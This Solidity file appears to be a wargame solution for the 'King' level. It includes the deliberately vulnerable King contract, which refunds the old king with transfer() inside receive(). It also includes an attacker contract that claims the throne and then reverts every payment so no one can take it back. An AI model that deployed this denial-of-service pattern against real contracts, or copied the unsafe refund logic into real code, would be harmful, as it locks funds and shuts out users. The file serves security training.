// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract King {
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor() payable {
        owner = payable(msg.sender);
        king = payable(msg.sender);
        prize = msg.value;
    }

    receive() external payable {
        require(
            msg.value >= prize || msg.sender == owner,
            "Not enough ether to claim the hill"
        );
        king.transfer(msg.value);
        king = payable(msg.sender);
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract Level9Solution is Ownable {
    bool oneTime;
    address payable kingAddress;

    constructor(address payable _kingAddress) {
        kingAddress = _kingAddress;
    }

    function takeControlForever() public payable onlyOwner {
        uint256 prize = King(kingAddress).prize();
        uint256 valueSent = msg.value;
        require(valueSent >= prize, "Not enough ether sent");
        (bool sent, ) = kingAddress.call{value: prize}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        require(false, "I am the King!");
    }
}
